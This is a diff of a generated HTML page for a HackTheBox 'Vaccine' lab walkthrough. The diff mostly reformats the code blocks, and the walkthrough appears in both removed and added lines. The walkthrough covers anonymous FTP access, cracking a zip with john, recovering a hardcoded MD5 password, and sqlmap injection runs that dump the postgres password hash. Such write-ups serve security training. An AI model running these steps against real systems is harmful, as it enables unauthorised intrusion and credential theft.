@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -16938,125 +16961,205 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 
 <h1 id="vaccine-a-hackthebox-machine">Vaccine - A HackTheBox machine</h1>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 Two open ports: 21 and 80</p>
 <p>Also, from nmap analysys, ftp service at 21 allows us to use anonymous signin with empty password:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ftp<span class="w"> </span><span class="nv">$ip</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># enter user &quot;anonymous&quot; and hit enter when prompted for password</span>
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>dir
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a># listed appears file backup.zip
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>get *
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>ftp<span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="c1"># enter user &quot;anonymous&quot; and hit enter when prompted for password</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>dir
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a># listed appears file backup.zip
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>get *
+</span></code></pre></div></td></tr></table></div>
 <p>Try to open zip file, but it's password protected, so we crak it with <a href="../john-the-ripper/">johntheripper</a>:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>zip2john<span class="w"> </span>nameoffile.zip<span class="w"> </span>&gt;<span class="w"> </span>zip.hashes
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>cat<span class="w"> </span>zip.hashes
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>john<span class="w"> </span>zip.hashes
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Proceeding with wordlist:/usr/share/john/password.lst</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># 741852963        (backup.zip)    </span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c1">#Unzip file:</span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>unzip<span class="w"> </span>backup.zip
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="c1"># Echo index file</span>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>cat<span class="w"> </span>index.php
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>zip2john<span class="w"> </span>nameoffile.zip<span class="w"> </span>&gt;<span class="w"> </span>zip.hashes
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>cat<span class="w"> </span>zip.hashes
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>john<span class="w"> </span>zip.hashes
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="c1"># Proceeding with wordlist:/usr/share/john/password.lst</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="c1"># 741852963        (backup.zip)    </span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="c1">#Unzip file:</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>unzip<span class="w"> </span>backup.zip
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="c1"># Echo index file</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>cat<span class="w"> </span>index.php
+</span></code></pre></div></td></tr></table></div>
 <p>Before the html code there is a piece of php starting the session. Username and password are hard encoded there:</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">session_start</span><span class="p">();</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="s2">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>      <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;true&quot;</span><span class="p">;</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: dashboard.php&quot;</span><span class="p">);</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span class="p">}</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>  <span class="p">}</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="cp">?&gt;</span>
-</span></code></pre></div>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span>
+<span class="normal"><a href="#__codelineno-4-7">7</a></span>
+<span class="normal"><a href="#__codelineno-4-8">8</a></span>
+<span class="normal"><a href="#__codelineno-4-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="nb">session_start</span><span class="p">();</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="s2">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>      <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;true&quot;</span><span class="p">;</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: dashboard.php&quot;</span><span class="p">);</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>    <span class="p">}</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>  <span class="p">}</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>In crackstation.net, we obtain that the hash "2cb42f8734ea607eefed3b70af13bbd3" was md5 encrypted and that actual password is "qwerty789"</p>
 <p>With this, open browser and enter username and password. You will be redirected to: htpp://$ip/dashboard.php</p>
 <p>Search box triggers a error message on frontend when introducing simple quotation mark as imput "'":</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a> ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: Select * from cars where name ilike &#39;%&#39;%&#39; ^
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a> ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: Select * from cars where name ilike &#39;%&#39;%&#39; ^
+</span></code></pre></div></td></tr></table></div>
 <p>This tells us about a sql injection vulnerability.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Ask for backend DBMS</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w">      </span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1">#---------</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># [11:03:27] [INFO] the back-end DBMS is PostgreSQL</span>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1">#web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1">#web application technology: Apache 2.4.41</span>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c1">#back-end DBMS: PostgreSQL</span>
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
-</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
-</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
-</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="c1"># Ask for databases</span>
-</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--dbs
-</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
-</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="c1"># ------</span>
-</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="c1"># [11:06:12] [INFO] fetching database (schema) names available databases [3]:</span>
-</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="c1"># [*] information_schema</span>
-</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="c1"># [*] pg_catalog</span>
-</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="c1"># [*] public</span>
-</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>
-</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>
-</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
-</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="c1"># Ask for tables in db pg_catalog</span>
-</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>-D<span class="w"> </span>pg_catalog<span class="w"> </span>--tables
-</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>
-</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="c1"># Response contains 62 tables. </span>
-</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
-</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>
-</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="c1"># Ask for users</span>
-</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--users<span class="w"> </span>
-</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>
-</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a><span class="c1"># -----</span>
-</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a><span class="c1"># [11:10:16] [INFO] resumed: &#39;postgres&#39;</span>
-</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a><span class="c1"># database management system users [1]:</span>
-</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="c1"># [*] postgres</span>
-</span><span id="__span-6-36"><a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>
-</span><span id="__span-6-37"><a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>
-</span><span id="__span-6-38"><a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>-D<span class="w"> </span>pg_catalog<span class="w"> </span>-T<span class="w"> </span>pg_user<span class="w"> </span>-C<span class="w"> </span>passwd,usebypassrls,useconfig,usecreatedb,usename,userepl,usesuper,usesysid,valuntil<span class="w"> </span>--dump
-</span><span id="__span-6-39"><a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>
-</span><span id="__span-6-40"><a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>
-</span><span id="__span-6-41"><a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a>
-</span><span id="__span-6-42"><a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a><span class="c1"># Ask for passwords</span>
-</span><span id="__span-6-43"><a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--passwords<span class="w"> </span>--dump
-</span><span id="__span-6-44"><a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>
-</span><span id="__span-6-45"><a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a><span class="c1"># -----</span>
-</span><span id="__span-6-46"><a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a><span class="c1"># database management system users password hashes:</span>
-</span><span id="__span-6-47"><a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a><span class="c1"># [*] postgres [1]:</span>
-</span><span id="__span-6-48"><a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a><span class="c1">#    password hash: md52d58e0637ec1e94cdfba3d1c26b67d01</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span>
+<span class="normal"><a href="#__codelineno-6-13">13</a></span>
+<span class="normal"><a href="#__codelineno-6-14">14</a></span>
+<span class="normal"><a href="#__codelineno-6-15">15</a></span>
+<span class="normal"><a href="#__codelineno-6-16">16</a></span>
+<span class="normal"><a href="#__codelineno-6-17">17</a></span>
+<span class="normal"><a href="#__codelineno-6-18">18</a></span>
+<span class="normal"><a href="#__codelineno-6-19">19</a></span>
+<span class="normal"><a href="#__codelineno-6-20">20</a></span>
+<span class="normal"><a href="#__codelineno-6-21">21</a></span>
+<span class="normal"><a href="#__codelineno-6-22">22</a></span>
+<span class="normal"><a href="#__codelineno-6-23">23</a></span>
+<span class="normal"><a href="#__codelineno-6-24">24</a></span>
+<span class="normal"><a href="#__codelineno-6-25">25</a></span>
+<span class="normal"><a href="#__codelineno-6-26">26</a></span>
+<span class="normal"><a href="#__codelineno-6-27">27</a></span>
+<span class="normal"><a href="#__codelineno-6-28">28</a></span>
+<span class="normal"><a href="#__codelineno-6-29">29</a></span>
+<span class="normal"><a href="#__codelineno-6-30">30</a></span>
+<span class="normal"><a href="#__codelineno-6-31">31</a></span>
+<span class="normal"><a href="#__codelineno-6-32">32</a></span>
+<span class="normal"><a href="#__codelineno-6-33">33</a></span>
+<span class="normal"><a href="#__codelineno-6-34">34</a></span>
+<span class="normal"><a href="#__codelineno-6-35">35</a></span>
+<span class="normal"><a href="#__codelineno-6-36">36</a></span>
+<span class="normal"><a href="#__codelineno-6-37">37</a></span>
+<span class="normal"><a href="#__codelineno-6-38">38</a></span>
+<span class="normal"><a href="#__codelineno-6-39">39</a></span>
+<span class="normal"><a href="#__codelineno-6-40">40</a></span>
+<span class="normal"><a href="#__codelineno-6-41">41</a></span>
+<span class="normal"><a href="#__codelineno-6-42">42</a></span>
+<span class="normal"><a href="#__codelineno-6-43">43</a></span>
+<span class="normal"><a href="#__codelineno-6-44">44</a></span>
+<span class="normal"><a href="#__codelineno-6-45">45</a></span>
+<span class="normal"><a href="#__codelineno-6-46">46</a></span>
+<span class="normal"><a href="#__codelineno-6-47">47</a></span>
+<span class="normal"><a href="#__codelineno-6-48">48</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="c1"># Ask for backend DBMS</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w">      </span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="c1">#---------</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="c1"># [11:03:27] [INFO] the back-end DBMS is PostgreSQL</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="c1">#web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="c1">#web application technology: Apache 2.4.41</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="c1">#back-end DBMS: PostgreSQL</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="c1"># Ask for databases</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--dbs
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14"></a>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="c1"># ------</span>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="c1"># [11:06:12] [INFO] fetching database (schema) names available databases [3]:</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="c1"># [*] information_schema</span>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18"></a><span class="c1"># [*] pg_catalog</span>
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19"></a><span class="c1"># [*] public</span>
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20"></a>
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21"></a>
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22"></a>
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23"></a><span class="c1"># Ask for tables in db pg_catalog</span>
